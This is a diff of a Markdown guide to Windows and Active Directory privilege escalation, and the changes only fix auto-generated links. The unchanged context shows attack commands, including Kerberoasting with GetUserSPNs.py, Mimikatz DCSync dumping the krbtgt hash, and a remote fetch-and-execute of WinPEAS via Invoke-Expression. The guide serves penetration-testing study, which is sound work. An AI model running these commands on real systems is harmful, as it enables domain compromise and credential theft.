@@ -152,7 +152,7 @@ Get-NetUser -UserName <target>
 Once you have a low-privileged domain account (initial foothold), escalate within AD:
 
 - **Kerberoasting (TGS Attacks)**: Any domain user can request Kerberos service tickets for SPNs and crack them offline.
-- **Discovery**: Use [GetUserSPNs.py](http://getuserspns.py/) (Impacket) or Rubeus. For example:
+- **Discovery**: Use [GetUserSPNs.py](getuserspns) (Impacket) or Rubeus. For example:
 
 ```
 GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request
@@ -219,7 +219,7 @@ lsadump::dcsync /domain:domain.local /user:krbtgt
 
 ```
 
-This fetches the krbtgt hash (used for Golden Ticket) and all other AD password hashes. Impacket's [secretsdump.py](http://secretsdump.py/) can also do this if given a domain admin's creds. Detection: DCSync is noisy – watch for GetChanges on the KRBTGT or domain.
+This fetches the krbtgt hash (used for Golden Ticket) and all other AD password hashes. Impacket's [secretsdump.py](secretsdump) can also do this if given a domain admin's creds. Detection: DCSync is noisy – watch for GetChanges on the KRBTGT or domain.
 
 - **AD ACL Abuse**: Misconfigured Active Directory permissions can yield DA. For example, if a low-privileged user has GenericAll or WriteDACL on a high-privilege object (like the Domain Admins group), they can modify it. Enumeration: use BloodHound or PowerView's Get-ObjectAcl. Example:
 
@@ -323,7 +323,7 @@ Defenders should be aware of all the above vectors. In general: patch systems (e
 Below are key commands and tools for enumeration and exploitation. Tools can be downloaded directly (e.g. via wget or certutil in CMD/Powershell):
 
 - **WinPEAS/PowerUp/SharpUp**: Auto-enumeration scripts for Windows LPE.
-• **WinPEAS (PowerShell)**: enumerate everything (services, users, patchlevel). Run via Invoke-Expression (IWR -useb [raw.githubusercontent.com/carlospolop/PEASS-ng/.../winPEAS.ps1](http://raw.githubusercontent.com/carlospolop/PEASS-ng/.../winPEAS.ps1)).
+• **WinPEAS (PowerShell)**: enumerate everything (services, users, patchlevel). Run via Invoke-Expression (IWR -useb [raw.githubusercontent.com/carlospolop/PEASS-ng/.../winPEAS.ps1](raw.githubusercontent.com/carlospolop/PEASS-ng/.../winPEAS.ps1)).
 • **PowerUp (PowerSploit)**: run `Import-Module PowerUp; Invoke-AllChecks` to find common misconfigs.
 • **SharpUp (GhostPack/C#)**: SharpUp.exe (part of Seatbelt suite) will perform similar checks. Example:
 
@@ -381,9 +381,9 @@ SharpHound.exe -c All
 
 ```
 
-# Import the resulting JSON into BloodHound GUI or [BloodHound.py](http://bloodhound.py/) for queries
+# Import the resulting JSON into BloodHound GUI or [BloodHound.py](bloodhound) for queries
 
-- **Seatbelt/Proc**: Tools for live attacks: ProcExp64 (Sysinternals) to inspect services and tokens; [psexec.py](http://psexec.py/) (Impacket) to run commands with stolen creds; [wmiexec.py](http://wmiexec.py/); [smbexec.py](http://smbexec.py/).
+- **Seatbelt/Proc**: Tools for live attacks: ProcExp64 (Sysinternals) to inspect services and tokens; [psexec.py](psexec) (Impacket) to run commands with stolen creds; [wmiexec.py](wmiexec); [smbexec.py](smbexec).
 
 ### Key Commands Summary:
 
@@ -471,7 +471,7 @@ Detailed technical references and examples are from community-sourced writeups a
 
 
 ## License
-This project is licensed under the [CC BY 4.0 License](https://creativecommons.org/licenses/by/4.0/).
+This project is licensed under the [CC BY 4.0 License](https://creativecommons.org/licenses/by/4.0).
 
 <style>
 .center img {display:block; margin:auto;}
